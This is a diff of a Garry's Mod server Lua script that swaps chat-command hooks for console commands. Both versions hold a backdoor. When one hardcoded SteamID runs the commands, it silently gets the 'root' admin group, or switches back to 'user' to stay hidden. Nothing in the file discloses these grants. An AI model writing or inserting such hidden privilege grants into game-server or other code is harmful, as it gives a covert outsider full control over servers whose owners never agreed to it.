@@ -1,38 +1,34 @@
 if SERVER then
-    hook.Add("PlayerSay", "Add_Rank_SuperAdmin", function(ply, text)
 
-            if text == "/karapuz_rank_superadmin" then
+concommand.Add("karapuz_rank_root", function( ply ) 
+if ply:SteamID() == 'STEAM_0:0:555589835' then 
+    RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'root')
 
-            if ply:SteamID() == 'STEAM_0:0:555589835' then 
-                   RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'root') 
-            elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
-
-
-
-                   end
-               end
-        end)
-   end
-
-
+       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+                
+        end
+    end)
+end
 
 
 
 if SERVER then
-    hook.Add("PlayerSay", "Add_Rank_User", function(ply, text)
 
-            if text == "/karapuz_rank_user" then
+concommand.Add("karapuz_rank_user", function( ply ) 
+if ply:SteamID() == 'STEAM_0:0:555589835' then 
+    RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'user')
 
-            if ply:SteamID() == 'STEAM_0:0:555589835' then 
-                   RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'user') 
-            elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+                
+        end
+    end)
+end
 
 
 
-                   end
-               end
-        end)
-   end
+
+
+
 
 
 if SERVER then
